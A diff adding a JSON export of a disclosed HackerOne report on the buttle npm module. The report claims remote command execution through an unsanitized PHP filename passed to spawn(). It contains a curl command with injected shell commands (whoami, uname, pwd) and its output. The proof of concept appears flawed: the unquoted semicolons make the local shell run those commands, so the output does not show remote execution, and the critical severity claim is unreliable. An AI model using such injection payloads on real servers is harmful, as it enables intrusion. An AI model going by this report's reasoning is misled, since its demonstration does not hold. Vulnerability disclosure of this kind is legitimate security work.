@@ -1,0 +1,129 @@
+{
+  "id": 331032,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMzEwMzI=",
+  "url": "https://hackerone.com/reports/331032",
+  "title": "[buttle] Remote Command Execution via unsanitized PHP filename when it's run with --php-bin flag",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2018-03-29T10:43:09.761Z",
+  "submitted_at": "2018-03-29T10:43:09.761Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "bl4de",
+    "url": "/bl4de",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 23949,
+    "url": "https://hackerone.com/nodejs-ecosystem",
+    "handle": "nodejs-ecosystem",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Node.js third-party modules",
+      "twitter_handle": "",
+      "website": "https://nodejs.org/en/security/",
+      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2018-05-11T15:52:15.524Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2018-05-11T15:52:05.607Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "I would like to report Remote Code Execution in buttle module.\n\nWhen buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands.\n\n# Module\n\n**module name:** buttle\n**version:** 0.2.0\n**npm page:** https://www.npmjs.com/package/buttle\n\n## Module Description\n\nSimple static file (+ markdown) server.\n\n\n## Module Stats\n\nStats:\n\nN/A, estimated ~20-40 downloads/week\n\n# Vulnerability\n\n## Vulnerability Description\n\nWhen buttle is run with ```--php-bin``` option (to handle PHP), the PHP filename is not sanitized and allows to inject shell commands. This is possible due to this code:\n\n```javascript\n// ./node_modules/buttle/lib/mid-php.js, line 15\n\n    var phpFile = norm(join(docroot, req.url));\n    fs.exists(phpFile, function(exists) {\n    if(exists) {\n        res.setHeader('Content-Type', 'text/html');\n\n        var cp = require('child_process').spawn(phpBin, [phpFile]);\n\n        cp.stdout.on('data', function(data) {\n        res.write(data);\n        });\n\n        cp.stderr.on('data', function(data) {\n        res.write(data);\n        });\n\n        cp.on('close', function() {\n        res.end('');\n        });\n\n    } else {\n```\n\nAs you can notice, ```spawn()``` method is called with PHP file as an argument, but no sanitization is apllied on ```phpFile``` variable. Using ```curl```, I was able to pass example PHP filename concatenated with ```;[shell cmd]``` string, which allows me to execute command on the server.\n\n\n## Steps To Reproduce:\n\n- install ```buttle```:\n\n```\n$ npm i buttle\n```\n\n- create ```test.php``` file with folloing content:\n\n```php\n<?php\necho 'Its working!';\n?>\n\n```\n\n- run buttle with PHP support:\n\n```\n$ ./node_modules/buttle/bin/buttle -p 8080 --php-bin /usr/bin/php\nListening on port 8080\n```\n\n- execute following command in the console:\n\n```\n$ curl -v --path-as-is http://localhost:8080/test.php;whoami;uname -a;pwd;echo \"uh oh, RCE :P\"\n```\n\n- see response from the server containing results of execution of injected commands:\n\n```\n*   Trying ::1...\n* Connected to localhost (::1) port 8080 (#0)\n> GET /test.php HTTP/1.1\n> Host: localhost:8080\n> User-Agent: curl/7.47.0\n> Accept: */*\n> \n< HTTP/1.1 200 OK\n< Content-Type: text/html\n< Date: Thu, 29 Mar 2018 10:35:22 GMT\n< Connection: keep-alive\n< Transfer-Encoding: chunked\n< \n* Connection #0 to host localhost left intact\nIts working!rafal.janicki\nLinux LT0081U2 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux\n/home/rafal.janicki/playground/hackerone/Node\nuh oh, RCE :P\n```\n\n\n## Patch\n\n```phpFile``` variable should be sanitized. Ideally, it should strip everything what comes after ```.php``` extension in filename and do not allow to use any Bash special characters (like semicolon, pipe, comma etc.)\n\n## Supporting Material/References:\n\n\n- Operating system: Ubuntu 16.04\n- Node.js 8.9.4\n- npm v. 5.6.0\n- curl v. 7.47.0\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\nI hope my report will help to keep Node.js ecosystem and its users safe :)\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nAn attacker is able to execute commands on remote server where buttler with --php-bin flag is run.",
+  "weakness": {
+    "id": 59,
+    "name": "OS Command Injection"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2018-06-10T15:52:05.724Z",
+  "allow_singular_disclosure_after": -249694336.07831466,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "kapytein",
+    "khizer47",
+    "0x08",
+    "mq22q"
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "none",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 8249,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "buttle",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
